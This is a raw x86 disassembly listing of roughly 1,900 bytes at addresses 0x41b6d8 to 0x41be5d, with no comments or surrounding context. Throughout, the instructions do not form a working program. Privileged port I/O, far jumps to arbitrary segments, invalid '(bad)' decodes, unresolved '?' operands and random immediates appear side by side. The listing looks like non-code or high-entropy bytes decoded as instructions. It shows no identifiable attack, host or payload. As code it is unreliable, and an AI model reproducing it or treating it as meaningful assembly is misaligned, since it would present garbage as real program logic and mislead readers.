  41b6d8:	mov    bl,0x86
  41b6da:	inc    ebp
  41b6db:	sub    BYTE PTR [eax],ch
  41b6dd:	dec    ecx
  41b6de:	mov    esi,0xf23ce0f1
  41b6e3:	mov    dl,0xf1
  41b6e5:	sti    
  41b6e6:	addr16 addr16 mov eax,0xcb912f66
  41b6ed:	pop    ecx
  41b6ee:	xor    eax,DWORD PTR [edi-0x43]
  41b6f1:	push   ecx
  41b6f2:	test   eax,0x8caee94d
  41b6f7:	add    bh,0x9
  41b6fa:	inc    edi
  41b6fb:	daa    
  41b6fc:	or     DWORD PTR [eax],ebp
  41b6fe:	mov    ebx,0xaaa3e61e
  41b703:	pop    eax
  41b704:	adc    bl,BYTE PTR [ecx]
  41b706:	add    ecx,DWORD PTR [ecx+0x2e]
  41b709:	ss mov ch,0xcf
  41b70c:	add    eax,0x1cc94165
  41b711:	push   ds
  41b712:	sti    
  41b713:	in     eax,0x2e
  41b715:	fs jmp 0x2f1f:0xf696633
  41b71d:	not    BYTE PTR [eax+0x5c]
  41b720:	int3   
  41b721:	daa    
  41b722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b723:	push   eax
  41b724:	cmp    ebp,DWORD PTR [ebp+0x7f6e4ab9]
  41b72a:	pop    es
  41b72b:	dec    ecx
  41b72c:	jae    0x41b7aa
  41b72e:	push   0xedaca532
  41b733:	lahf   
  41b734:	or     BYTE PTR [edi],ah
  41b736:	jae    0x41b6db
  41b738:	pop    ss
  41b739:	add    al,0xd1
  41b73b:	out    0x28,al
  41b73d:	out    dx,eax
  41b73e:	and    al,0xb7
  41b740:	mov    eax,ds:0x7a2ffe90
  41b745:	imul   cx,WORD PTR [edi-0xf],0xa2bc
  41b74b:	lods   al,BYTE PTR ds:[esi]
  41b74c:	pop    ecx
  41b74d:	test   DWORD PTR [ecx],0xe39deac8
  41b753:	sahf   
  41b754:	xor    bl,BYTE PTR [edi]
  41b756:	sub    bl,BYTE PTR [ebx+0x53]
  41b759:	lods   al,BYTE PTR ds:[esi]
  41b75a:	sub    eax,0x6b3b51d1
  41b75f:	icebp  
  41b760:	ds dec ebp
  41b762:	mov    edi,0xbe28748
  41b767:	and    BYTE PTR [edx-0x2d],bh
  41b76a:	xlat   BYTE PTR ds:[ebx]
  41b76b:	adc    DWORD PTR [ebx],ecx
  41b76d:	mov    ds:0xc8469fb9,eax
  41b772:	cli    
  41b773:	scas   al,BYTE PTR es:[edi]
  41b774:	dec    edx
  41b775:	retf   0xf153
  41b778:	call   0x4b74242d
  41b77d:	cmp    ebp,DWORD PTR [edx-0x5]
  41b780:	rcr    BYTE PTR ds:0xb617bd2b,0x72
  41b787:	ins    BYTE PTR es:[edi],dx
  41b788:	imul   esp,ebp,0xd8874589
  41b78e:	mov    cl,al
  41b790:	pop    ds
  41b791:	push   ds
  41b792:	lds    esp,FWORD PTR ds:0x2b643c14
  41b798:	rol    DWORD PTR [edx+eiz*2-0x7ae7724],1
  41b79f:	inc    eax
  41b7a0:	and    dl,BYTE PTR [ebp-0x2f94818]
  41b7a6:	call   FWORD PTR [eax+0x43146adb]
  41b7ac:	xchg   esi,eax
  41b7ad:	retf   
  41b7ae:	and    ch,al
  41b7b0:	lock sbb DWORD PTR [ecx-0x942f1e9],edi
  41b7b7:	jno    0x41b819
  41b7b9:	into   
  41b7ba:	mov    al,0x22
  41b7bc:	jns    0x41b7f1
  41b7be:	mov    eax,ds:0xb944df56
  41b7c3:	jo     0x41b826
  41b7c5:	sbb    eax,DWORD PTR [eax]
  41b7c7:	xchg   ebx,eax
  41b7c8:	es cmp al,0x64
  41b7cb:	(bad)  
  41b7cd:	fild   QWORD PTR [eax]
  41b7cf:	addr16 dec ebx
  41b7d1:	fnstsw WORD PTR [eax+edi*2-0x705e7d4a]
  41b7d8:	dec    eax
  41b7d9:	ss ds ret 
  41b7dc:	or     DWORD PTR [edx-0x33b3519e],ecx
  41b7e2:	pop    edx
  41b7e3:	dec    edx
  41b7e4:	int3   
  41b7e5:	loope  0x41b82f
  41b7e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7e8:	rcr    BYTE PTR [edi+eiz*2],cl
  41b7eb:	sbb    al,0x26
  41b7ed:	psubd  mm2,mm5
  41b7f0:	jns    0x41b7dc
  41b7f2:	jns    0x41b81f
  41b7f4:	pop    ebp
  41b7f5:	ins    BYTE PTR es:[edi],dx
  41b7f6:	mov    esi,0xb371ae02
  41b7fb:	ret    0x832b
  41b7fe:	imul   edi,DWORD PTR [edx+ebp*8],0x13
  41b802:	(bad)  [ebp+0x63]
  41b805:	mov    BYTE PTR [esi+0x7eb62751],dl
  41b80b:	push   cs
  41b80c:	gs inc ebx
  41b80e:	inc    ebx
  41b80f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b810:	mov    ah,0xfe
  41b812:	xor    al,0x46
  41b814:	mov    al,0x1a
  41b816:	or     BYTE PTR [ecx+edi*2-0x6823ca01],ah
  41b81d:	rcl    BYTE PTR [edi-0x1e],0x61
  41b821:	sub    al,0x22
  41b823:	and    al,0x6b
  41b825:	add    ebx,ebp
  41b827:	test   eax,0xbe273a44
  41b82c:	cmp    al,al
  41b82e:	mov    DWORD PTR [eax-0x457a4142],edi
  41b834:	push   ds
  41b835:	hlt    
  41b836:	or     dl,BYTE PTR [edi]
  41b838:	add    edx,DWORD PTR [esi+0x4f41b506]
  41b83e:	daa    
  41b83f:	sbb    DWORD PTR [ecx],esi
  41b841:	cmp    edx,DWORD PTR [eax-0x16]
  41b844:	pop    edi
  41b845:	xor    eax,0x7d17c585
  41b84a:	jo     0x41b7ef
  41b84c:	pop    edx
  41b84d:	into   
  41b84e:	popa   
  41b84f:	cdq    
  41b850:	cmc    
  41b851:	ja     0x41b851
  41b853:	shr    DWORD PTR [bp+si+0x42],cl
  41b857:	cs xchg edi,eax
  41b859:	inc    esi
  41b85a:	dec    ebp
  41b85b:	call   0xace3:0x2fb09e51
  41b862:	sub    al,0xb
  41b864:	add    cl,BYTE PTR ss:[eax+0x1f]
  41b868:	dec    esp
  41b869:	aam    0x70
  41b86b:	ins    DWORD PTR es:[edi],dx
  41b86c:	jns    0x41b80d
  41b86e:	out    dx,eax
  41b86f:	dec    edx
  41b870:	out    0x78,al
  41b872:	lahf   
  41b873:	or     edi,DWORD PTR [eax+edi*4]
  41b876:	das    
  41b877:	gs add esi,ecx
  41b87a:	xchg   esp,eax
  41b87b:	and    DWORD PTR [ebx-0x3f370d84],edx
  41b881:	call   0x30ef:0x82882cce
  41b888:	inc    ebx
  41b889:	inc    esp
  41b88a:	mov    ch,0x23
  41b88c:	pop    ecx
  41b88d:	retf   0x6cfc
  41b890:	imul   edi,DWORD PTR [ecx],0xbcc08f20
  41b896:	xlat   BYTE PTR ds:[ebx]
  41b897:	in     al,0x98
  41b899:	inc    ebp
  41b89a:	sti    
  41b89b:	push   0x3aaa88f9
  41b8a0:	ja     0x41b8e6
  41b8a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8a3:	gs clc 
  41b8a5:	inc    edx
  41b8a6:	xor    eax,0xee7d3259
  41b8ab:	retf   0x69
  41b8ae:	scas   al,BYTE PTR es:[edi]
  41b8af:	lds    edi,FWORD PTR [edx+edx*8]
  41b8b2:	inc    ebp
  41b8b3:	mov    edi,0xd38b8add
  41b8b8:	sbb    al,0x76
  41b8ba:	sbb    DWORD PTR [edi+0x67412c09],ebp
  41b8c0:	(bad)  
  41b8c1:	pop    edx
  41b8c2:	sub    BYTE PTR [edx+0x389903a0],0x0
  41b8c9:	lahf   
  41b8ca:	push   ss
  41b8cb:	pop    ecx
  41b8cc:	push   edi
  41b8cd:	jg     0x41b8bd
  41b8cf:	xchg   DWORD PTR [esi+0x3],esp
  41b8d2:	pop    edi
  41b8d3:	jp     0x41b8a8
  41b8d5:	add    edi,0x60
  41b8d8:	mov    WORD PTR [edx+0x0],?
  41b8db:	aad    0xa4
  41b8dd:	js     0x41b959
  41b8df:	dec    edi
  41b8e0:	daa    
  41b8e1:	jmp    0x41b921
  41b8e3:	cmp    eax,0x505245da
  41b8e8:	mov    al,ds:0x140dcc03
  41b8ed:	push   0x9b954382
  41b8f2:	pop    esi
  41b8f3:	mov    ch,0x40
  41b8f5:	es leave 
  41b8f7:	popf   
  41b8f8:	add    DWORD PTR [edx+edi*8+0x68],0xa8f6c5c4
  41b900:	imul   edi,DWORD PTR [ebx-0x60],0xffffff8d
  41b904:	add    esi,esp
  41b906:	test   DWORD PTR [ecx-0x2e96524f],0xbdd01abf
  41b910:	fs jmp 0x3567ac2a
  41b916:	arpl   WORD PTR [edi+0x2dc577af],bx
  41b91c:	jno    0x41b961
  41b91e:	pop    eax
  41b91f:	adc    dl,BYTE PTR [ebx]
  41b921:	pop    esp
  41b922:	mov    WORD PTR [ebp+eiz*8+0x2e],es
  41b926:	pop    ebp
  41b927:	call   0x52d6ec9c
  41b92c:	mov    ah,0x2
  41b92f:	jmp    0x305ead36
  41b934:	outs   dx,DWORD PTR ds:[esi]
  41b935:	lods   al,BYTE PTR ds:[esi]
  41b936:	push   0x2d
  41b938:	stos   BYTE PTR es:[edi],al
  41b939:	and    DWORD PTR [edx],edi
  41b93b:	adc    eax,0x601744c8
  41b940:	jmp    0x821b:0x5b44beaf
  41b947:	lahf   
  41b948:	dec    edx
  41b949:	stos   DWORD PTR es:[edi],eax
  41b94a:	ret    
  41b94b:	fst    st(5)
  41b94d:	inc    esp
  41b94e:	cmp    edx,DWORD PTR [edi]
  41b950:	repz pop esp
  41b952:	fidiv  DWORD PTR [edi+eax*8]
  41b955:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41b957:	mov    dl,0xfe
  41b959:	fdivr  QWORD PTR [edx+0x32600db5]
  41b95f:	jp     0x41b8f6
  41b961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b962:	rcr    DWORD PTR [eax+0x34301e2e],1
  41b968:	neg    eax
  41b96a:	dec    edx
  41b96b:	inc    ebx
  41b96c:	mov    WORD PTR [esi],es
  41b96e:	mov    ss,WORD PTR [ebp+0x62]
  41b971:	dec    eax
  41b972:	cld    
  41b973:	pop    edi
  41b974:	jae    0x41b9cf
  41b976:	pop    edi
  41b977:	ins    DWORD PTR es:[edi],dx
  41b978:	mov    eax,0xb2abd67b
  41b97d:	and    bh,dh
  41b97f:	jmp    0xa7f1:0xbd75fb02
  41b986:	mov    BYTE PTR [ebp+0x55540149],0x48
  41b98d:	jmp    0x436f:0xd3cadbec
  41b994:	shl    DWORD PTR [ecx-0x46ef1382],0xf5
  41b99b:	mov    al,ds:0xa8bcd67a
  41b9a0:	pop    edx
  41b9a1:	xchg   edi,eax
  41b9a2:	test   BYTE PTR [esi+0x1e2a9e9a],0xf4
  41b9a9:	iret   
  41b9aa:	ss loopne 0x41b985
  41b9ad:	sti    
  41b9ae:	or     esi,DWORD PTR [ecx]
  41b9b0:	jg     0x41b951
  41b9b2:	dec    esp
  41b9b3:	xchg   BYTE PTR fs:[ecx+0x1cdb88d9],dh
  41b9ba:	push   ecx
  41b9bb:	(bad)  
  41b9bc:	cmp    al,0x8d
  41b9be:	xchg   ecx,eax
  41b9bf:	js     0x41b95a
  41b9c1:	cmp    BYTE PTR [edx+0x34853ce1],ah
  41b9c7:	fstp   TBYTE PTR [edi+0x48]
  41b9ca:	jp     0x41b9a5
  41b9cc:	(bad)  
  41b9cd:	push   esp
  41b9ce:	daa    
  41b9cf:	das    
  41b9d0:	fistp  DWORD PTR [esp+eiz*2-0xe]
  41b9d4:	xor    al,0xe0
  41b9d6:	xchg   ebx,eax
  41b9d7:	fs jnp 0x41ba19
  41b9da:	popf   
  41b9db:	pop    esp
  41b9dc:	adc    BYTE PTR [ebp+0xf],ch
  41b9df:	hlt    
  41b9e0:	retf   0xaf3e
  41b9e3:	fidivr DWORD PTR [eax-0x2b]
  41b9e6:	ins    BYTE PTR es:[edi],dx
  41b9e7:	mov    ebp,DWORD PTR [ebp+0x32]
  41b9ea:	pop    es
  41b9eb:	mov    eax,ds:0x4d3af502
  41b9f0:	std    
  41b9f1:	scas   al,BYTE PTR es:[edi]
  41b9f2:	stos   DWORD PTR es:[edi],eax
  41b9f3:	rcl    DWORD PTR [edx-0x41b8a741],0x91
  41b9fa:	stc    
  41b9fb:	nop
  41b9fc:	cmp    eax,0x75e2ecef
  41ba01:	out    0xe2,al
  41ba03:	cmp    eax,eax
  41ba05:	fst    DWORD PTR [ecx-0x2fc615fb]
  41ba0b:	test   al,0xdb
  41ba0d:	in     al,0x7
  41ba0f:	mov    ch,0xef
  41ba11:	add    al,0xec
  41ba13:	pusha  
  41ba14:	aam    0xe4
  41ba16:	lods   eax,DWORD PTR ds:[esi]
  41ba17:	in     eax,dx
  41ba18:	je     0x41ba8e
  41ba1a:	data16 xor al,0x3
  41ba1d:	pop    ecx
  41ba1e:	in     al,dx
  41ba1f:	or     ch,bh
  41ba21:	fcmovb st,st(1)
  41ba23:	(bad)  
  41ba24:	sub    al,0xd9
  41ba26:	or     al,0xf4
  41ba28:	fnstcw WORD PTR [esi+esi*4+0x48]
  41ba2c:	test   BYTE PTR [edi],dl
  41ba2e:	ja     0x41ba41
  41ba30:	jno    0x41b9f7
  41ba32:	cwde   
  41ba33:	xchg   edi,eax
  41ba34:	(bad)  
  41ba35:	les    edx,FWORD PTR [edx]
  41ba37:	test   al,0xea
  41ba39:	fucomp st(4)
  41ba3b:	inc    edx
  41ba3c:	sbb    al,BYTE PTR [edx]
  41ba3e:	je     0x41b9c7
  41ba40:	data16 (bad) 
  41ba42:	xor    eax,DWORD PTR [esi+0x5fb9eac6]
  41ba48:	imul   edi,ecx,0x3ca1bc52
  41ba4e:	cdq    
  41ba4f:	popf   
  41ba50:	in     eax,0x3e
  41ba52:	lock push eax
  41ba54:	and    al,0xdd
  41ba56:	push   0xfffffff6
  41ba58:	dec    esp
  41ba59:	data16 outs dx,BYTE PTR ds:[esi]
  41ba5b:	outs   dx,DWORD PTR ds:[esi]
  41ba5c:	add    BYTE PTR [ecx-0x4f],cl
  41ba5f:	rol    DWORD PTR [ecx-0x2],1
  41ba62:	pop    edi
  41ba63:	loopne 0x41ba34
  41ba65:	xor    BYTE PTR [ecx+0x6b],bh
  41ba68:	fidivr WORD PTR [edx+0x726af601]
  41ba6e:	les    ebp,FWORD PTR [ebp+0x25f85e2e]
  41ba74:	jg     0x41ba5c
  41ba76:	sti    
  41ba77:	cmp    al,BYTE PTR [edx+0x45]
  41ba7a:	aam    0xe3
  41ba7c:	arpl   cx,sp
  41ba7e:	inc    esp
  41ba7f:	call   0x8b0:0xdc09a0a7
  41ba86:	sub    eax,0xe0ff5759
  41ba8b:	mov    al,ds:0x2f4ac11f
  41ba90:	sbb    edi,DWORD PTR [esi+0x457d6592]
  41ba96:	pusha  
  41ba97:	dec    edx
  41ba98:	retf   0x616a
  41ba9b:	jge    0x41ba97
  41ba9d:	dec    ebx
  41ba9e:	(bad)  
  41ba9f:	pop    edx
  41baa0:	sub    esp,DWORD PTR [esi]
  41baa2:	imul   DWORD PTR [edx+ebx*4]
  41baa5:	inc    edi
  41baa6:	pavgb  mm6,QWORD PTR [ebp+ebx*1+0x74ed48ff]
  41baae:	fldcw  WORD PTR [esi-0x16cf06]
  41bab4:	xchg   edi,eax
  41bab5:	mov    ds:0xb9359134,eax
  41baba:	or     esi,DWORD PTR [edi+0x75]
  41babd:	xchg   ebp,eax
  41babe:	fisttp WORD PTR [ecx]
  41bac0:	(bad)  
  41bac1:	lods   eax,DWORD PTR ds:[esi]
  41bac2:	xchg   ebp,eax
  41bac3:	in     eax,0xab
  41bac5:	ins    BYTE PTR es:[edi],dx
  41bac6:	dec    ebp
  41bac7:	mov    eax,0xfe740a65
  41bacc:	adc    eax,0xbe370468
  41bad1:	ds jne 0x41bae6
  41bad4:	or     al,0x13
  41bad6:	loop   0x41bab6
  41bad8:	dec    eax
  41bad9:	or     BYTE PTR [edx-0x67],al
  41badc:	pop    edi
  41badd:	stos   BYTE PTR es:[edi],al
  41bade:	ret    
  41badf:	mov    ebp,0xe382fa55
  41bae4:	into   
  41bae5:	mov    dl,0xf3
  41bae7:	and    BYTE PTR [edi-0x43],cl
  41baea:	or     eax,0x52f2c45d
  41baef:	add    dl,bh
  41baf1:	sbb    ebx,DWORD PTR [edx-0x22bc76e3]
  41baf7:	add    eax,0x356ad4a0
  41bafc:	pop    eax
  41bafd:	mov    dl,0x79
  41baff:	je     0x41bac9
  41bb01:	dec    edx
  41bb02:	adc    eax,0x94beb8e5
  41bb07:	imul   edi,edi,0xffffffce
  41bb0a:	stos   DWORD PTR es:[edi],eax
  41bb0b:	or     al,0xec
  41bb0d:	add    bh,0xf6
  41bb10:	xor    ch,BYTE PTR [eax+0x30]
  41bb13:	inc    esp
  41bb14:	fisub  WORD PTR ds:0x8c04c7af
  41bb1a:	pusha  
  41bb1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb1c:	adc    eax,0x313aca14
  41bb21:	dec    ebx
  41bb22:	xor    cl,BYTE PTR [edi-0x220374d8]
  41bb28:	sbb    ch,BYTE PTR [esi+0x4f]
  41bb2b:	inc    esp
  41bb2c:	xor    BYTE PTR [ebp-0x78d16cfd],0x8c
  41bb33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb34:	xchg   DWORD PTR [ecx-0x56afe6d0],edi
  41bb3a:	lds    ebx,FWORD PTR [ecx+0x21]
  41bb3d:	push   es
  41bb3e:	mov    esp,0x28929d8b
  41bb43:	sbb    DWORD PTR [eax+0x6cdc7c44],ebp
  41bb49:	adc    BYTE PTR [edx+0x6a],dl
  41bb4c:	(bad)  
  41bb4d:	or     ecx,DWORD PTR [ebx]
  41bb4f:	or     BYTE PTR [eax+0x44fdf9f8],bl
  41bb55:	mov    eax,0x6572d11b
  41bb5a:	fist   DWORD PTR [ecx-0x4]
  41bb5d:	fcom   DWORD PTR ds:0x8eaaa112
  41bb63:	xor    DWORD PTR [eax],0x667a6ab0
  41bb69:	add    cl,BYTE PTR [esp+ebp*8+0x29cb396b]
  41bb70:	daa    
  41bb71:	mov    ebx,0x4a2373f2
  41bb76:	xchg   DWORD PTR [eax-0x62efb2c1],eax
  41bb7c:	loope  0x41bbbe
  41bb7e:	jmp    0xe6713220
  41bb83:	test   BYTE PTR [edx+0x2084cbd5],dl
  41bb89:	pop    edi
  41bb8a:	mov    ?,WORD PTR [ecx]
  41bb8c:	and    ah,BYTE PTR [edx-0x156ff44b]
  41bb92:	popa   
  41bb93:	jp     0x41bb3b
  41bb95:	les    edi,FWORD PTR [esi-0x52]
  41bb98:	es sub al,0x4d
  41bb9b:	(bad)  [edx]
  41bb9d:	xchg   ebx,ebx
  41bb9f:	cmp    DWORD PTR ds:0xdff0debd,edx
  41bba5:	mov    dl,0xe7
  41bba7:	adc    DWORD PTR [edi-0x71a745fc],edi
  41bbad:	adc    eax,0xb6a7a21a
  41bbb2:	stos   DWORD PTR es:[edi],eax
  41bbb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbb4:	jns    0x41bb4a
  41bbb6:	hlt    
  41bbb7:	ins    DWORD PTR es:[edi],dx
  41bbb8:	cmp    bl,BYTE PTR [ebp+0x69978558]
  41bbbe:	fidivr WORD PTR [esi+0x6f11ed78]
  41bbc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbc5:	test   ah,bh
  41bbc7:	xchg   ebx,eax
  41bbc8:	test   DWORD PTR [ebx],0xec6e1191
  41bbce:	and    esi,0x2a892a21
  41bbd4:	mov    edx,0x302dc0bb
  41bbd9:	leave  
  41bbda:	lahf   
  41bbdb:	lods   eax,DWORD PTR ds:[esi]
  41bbdc:	js     0x41bbbd
  41bbde:	add    BYTE PTR [eax],dl
  41bbe0:	fcmovne st,st(3)
  41bbe2:	sub    eax,0xba11220c
  41bbe7:	push   ebp
  41bbe8:	xchg   ch,al
  41bbea:	aad    0xf8
  41bbec:	inc    esp
  41bbed:	frstor [edx+0x5ad2e658]
  41bbf3:	jne    0x41bc10
  41bbf5:	repz sub al,0xd2
  41bbf8:	xchg   ebx,eax
  41bbf9:	mov    bl,al
  41bbfb:	fisub  DWORD PTR [eax]
  41bbfd:	and    esp,DWORD PTR [esi+0x2b]
  41bc00:	inc    edi
  41bc01:	xor    DWORD PTR [edi+0x3a],eax
  41bc04:	and    BYTE PTR [ebp+0x3f],bl
  41bc07:	leave  
  41bc08:	jo     0x41bb9e
  41bc0a:	js     0x41bc16
  41bc0c:	jbe    0x41bba4
  41bc0e:	(bad)  
  41bc0f:	inc    ecx
  41bc10:	rcl    DWORD PTR [edi+eax*8],0xd8
  41bc14:	bound  ebx,QWORD PTR [ecx-0x17067de0]
  41bc1a:	push   ds
  41bc1b:	xchg   esi,eax
  41bc1c:	mov    ecx,0xf56cba82
  41bc21:	add    ecx,DWORD PTR [esi+ecx*8-0x7ddb1616]
  41bc28:	jns    0x41bc83
  41bc2a:	mov    DWORD PTR [eax+eiz*1],eax
  41bc2d:	adc    ah,BYTE PTR [ebp-0x3c887773]
  41bc33:	ins    DWORD PTR es:[edi],dx
  41bc34:	mov    eax,ds:0xe481d951
  41bc39:	cmc    
  41bc3a:	lods   al,BYTE PTR ds:[esi]
  41bc3b:	or     eax,0x3878636b
  41bc40:	std    
  41bc41:	push   es
  41bc42:	cli    
  41bc43:	stos   DWORD PTR es:[edi],eax
  41bc44:	fiadd  DWORD PTR [ecx-0x4d24f7c4]
  41bc4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc4b:	ficom  WORD PTR [esi-0x1137f7af]
  41bc51:	inc    ecx
  41bc52:	push   esi
  41bc53:	out    0x9,al
  41bc55:	mov    dh,0xe7
  41bc57:	adc    BYTE PTR [edi+ecx*8-0x7d432680],0x6f
  41bc5f:	les    ebx,FWORD PTR [ebx]
  41bc61:	xor    DWORD PTR [edi-0x666a97ed],ebx
  41bc67:	sar    ah,cl
  41bc69:	js     0x41bc26
  41bc6b:	jmp    0x7c3e:0x38ae327e
  41bc72:	scas   eax,DWORD PTR es:[edi]
  41bc73:	scas   al,BYTE PTR es:[edi]
  41bc74:	or     edi,eax
  41bc76:	pop    ebp
  41bc77:	leave  
  41bc78:	out    0x11,al
  41bc7a:	jae    0x41bced
  41bc7c:	inc    eax
  41bc7d:	mov    edi,0xdd4c7f3b
  41bc82:	pop    esi
  41bc83:	fidivr WORD PTR [ebp+edx*4+0x7]
  41bc87:	mov    bl,0x18
  41bc89:	jge    0x41bc47
  41bc8b:	fidiv  DWORD PTR [eax]
  41bc8d:	jno    0x41bd07
  41bc8f:	pop    edx
  41bc90:	jns    0x41bc19
  41bc92:	imul   ecx,DWORD PTR [ebx+0x3876566a],0xd82bb
  41bc9c:	mov    DWORD PTR [ebp+edx*2+0x54c7e507],ebp
  41bca3:	xchg   ebp,eax
  41bca4:	jno    0x41bc4e
  41bca6:	xor    DWORD PTR [ebp+0x4cc789d2],ebp
  41bcac:	aad    0xc
  41bcae:	jo     0x41bd03
  41bcb0:	add    al,BYTE PTR [ebx-0x1b7576fb]
  41bcb6:	ret    
  41bcb7:	mov    edx,0x42d3ca66
  41bcbc:	adc    eax,0x5c89d92b
  41bcc1:	js     0x41bc91
  41bcc3:	push   cs
  41bcc4:	daa    
  41bcc5:	pop    ds
  41bcc6:	push   esi
  41bcc7:	jecxz  0x41bcb9
  41bcc9:	jmp    0xa1ab:0x1986981d
  41bcd0:	test   al,0x43
  41bcd2:	xchg   esp,eax
  41bcd3:	dec    edx
  41bcd4:	ja     0x41bc5c
  41bcd6:	lds    edx,FWORD PTR [eax+0x5248f629]
  41bcdc:	stc    
  41bcdd:	stos   DWORD PTR es:[edi],eax
  41bcde:	lds    ecx,FWORD PTR cs:[edi-0x6c]
  41bce2:	dec    edx
  41bce3:	fistp  WORD PTR [esi+0x37ed0c5a]
  41bce9:	popa   
  41bcea:	aaa    
  41bceb:	push   edi
  41bcec:	jg     0x41bd59
  41bcee:	add    dl,dl
  41bcf0:	mov    dh,0xad
  41bcf2:	out    dx,eax
  41bcf3:	pop    esp
  41bcf4:	adc    BYTE PTR [ebp-0x77],bl
  41bcf7:	sub    eax,edi
  41bcf9:	frstor [esi-0x7b]
  41bcfc:	dec    eax
  41bcfd:	stc    
  41bcfe:	push   eax
  41bcff:	jge    0x41bc9f
  41bd01:	pushf  
  41bd02:	or     ch,BYTE PTR [ecx]
  41bd04:	loop   0x41bd13
  41bd06:	adc    ebx,DWORD PTR [esi]
  41bd08:	leave  
  41bd09:	jno    0x41bcd0
  41bd0b:	mov    al,0x67
  41bd0d:	les    edi,FWORD PTR ds:0xa15b2b5c
  41bd13:	(bad)  
  41bd14:	and    esp,DWORD PTR [ebx+0x60fcdaa9]
  41bd1a:	cmp    dl,BYTE PTR ds:[ebx-0x5faf0518]
  41bd21:	cmp    al,0x51
  41bd23:	inc    eax
  41bd24:	inc    ebp
  41bd25:	push   esi
  41bd26:	xor    al,0x8b
  41bd28:	push   ds
  41bd29:	xor    edi,DWORD PTR [edi]
  41bd2b:	fistp  DWORD PTR [ecx+0x55814169]
  41bd31:	pop    edi
  41bd32:	cmp    eax,DWORD PTR [edx]
  41bd34:	loopne 0x41bd9c
  41bd36:	neg    DWORD PTR [ecx]
  41bd38:	shl    dl,1
  41bd3a:	jmp    0xe3fa:0xe081d3da
  41bd41:	fst    DWORD PTR [esi-0x485b4bbe]
  41bd47:	ins    BYTE PTR es:[edi],dx
  41bd48:	fwait
  41bd49:	push   edi
  41bd4a:	push   cs
  41bd4b:	xor    eax,0x3afc21a6
  41bd50:	cdq    
  41bd51:	dec    ecx
  41bd52:	pop    ecx
  41bd53:	inc    edx
  41bd54:	push   edx
  41bd55:	pusha  
  41bd56:	fcomp  QWORD PTR [ecx]
  41bd58:	mov    ecx,0x6c3230d3
  41bd5d:	daa    
  41bd5e:	adc    BYTE PTR [ebp-0x1b],al
  41bd61:	jbe    0x41bd9b
  41bd63:	fsubr  st(1),st
  41bd65:	enter  0x6256,0xf8
  41bd69:	xchg   ebx,eax
  41bd6a:	sbb    al,0x72
  41bd6d:	adc    ch,BYTE PTR [ecx]
  41bd6f:	aad    0x3c
  41bd71:	arpl   WORD PTR [ecx-0x58285b6a],ax
  41bd77:	adc    DWORD PTR [eax-0x70e3b21e],ecx
  41bd7d:	pop    ebx
  41bd7e:	imul   edx,edi,0xdae2f1b3
  41bd84:	sbb    DWORD PTR [ebx],0xfde8a2f2
  41bd8a:	or     BYTE PTR [ecx+ecx*1],bh
  41bd8d:	mov    edi,0x8db81505
  41bd92:	xlat   BYTE PTR ds:[ebx]
  41bd93:	push   cs
  41bd94:	neg    DWORD PTR [edx]
  41bd96:	push   es
  41bd97:	inc    edx
  41bd98:	out    0xe7,eax
  41bd9a:	das    
  41bd9b:	mov    ebx,0xd7869db8
  41bda0:	enter  0x9c63,0xc
  41bda4:	dec    ecx
  41bda5:	icebp  
  41bda6:	into   
  41bda7:	sub    bh,BYTE PTR [edx+0x60]
  41bdaa:	push   ds
  41bdab:	and    BYTE PTR [edi+0x32605ff9],dl
  41bdb1:	js     0x41bdc7
  41bdb3:	sub    edi,ebx
  41bdb5:	push   0x45
  41bdb7:	mov    ecx,0xf6a3124c
  41bdbc:	sbb    eax,0x1e1d05f5
  41bdc1:	jl     0x41bd48
  41bdc3:	mov    ?,esi
  41bdc5:	call   0xfbd009d8
  41bdca:	cwde   
  41bdcb:	hlt    
  41bdcc:	ins    DWORD PTR es:[edi],dx
  41bdcd:	pop    ebx
  41bdce:	pop    edi
  41bdcf:	jge    0x41be10
  41bdd1:	dec    ebx
  41bdd2:	je     0x41bd5b
  41bdd4:	jp     0x41bd92
  41bdd6:	call   0x24cc419b
  41bddb:	das    
  41bddc:	mov    DWORD PTR [edi-0x5d],esi
  41bddf:	push   0x10
  41bde1:	xor    eax,eax
  41bde3:	das    
  41bde4:	mov    al,ds:0x6bc850cd
  41bde9:	in     al,0xba
  41bdeb:	cmp    ecx,edx
  41bded:	add    al,0xf8
  41bdef:	add    eax,0xbd95e2d0
  41bdf4:	xor    DWORD PTR [edi+esi*4-0x5084b5f9],0x41
  41bdfc:	adc    ah,dl
  41bdfe:	loopne 0x41be40
  41be00:	pop    edx
  41be01:	les    eax,FWORD PTR [esi+edi*2]
  41be04:	xor    BYTE PTR [ecx+0x5e],0x24
  41be08:	sbb    ch,BYTE PTR [eax+ebx*2]
  41be0b:	ret    
  41be0c:	jo     0x41be40
  41be0e:	sub    eax,0xa8770664
  41be13:	test   BYTE PTR [eax],ch
  41be15:	mov    bl,0x85
  41be17:	push   cs
  41be18:	fnsave [ecx-0x66]
  41be1b:	xor    cl,BYTE PTR [esi+0x1e]
  41be1e:	sub    eax,edx
  41be20:	push   ecx
  41be21:	or     DWORD PTR [edx+0xe9742a6],esi
  41be27:	cmp    DWORD PTR [ecx+0x3311b09b],0x13
  41be2e:	jl     0x41be2f
  41be30:	sub    eax,0x325600ea
  41be35:	xor    BYTE PTR [ecx+0x53],bh
  41be38:	mov    al,ds:0x8b50e1db
  41be3d:	sbb    BYTE PTR [ebp+0x23],ch
  41be40:	shl    BYTE PTR [ebx+edx*8],1
  41be43:	ins    BYTE PTR es:[edi],dx
  41be44:	rol    DWORD PTR [eax],0x6
  41be47:	dec    ebp
  41be48:	sub    ch,BYTE PTR [eax+0x55]
  41be4b:	lgs    ecx,FWORD PTR ds:0x4056b39f
  41be52:	cs daa 
  41be54:	addr16 pop ds
  41be56:	push   ebp
  41be57:	fiadd  DWORD PTR [ecx-0x533cace1]
  41be5d:	scas   eax,DWORD PTR es:[edi]
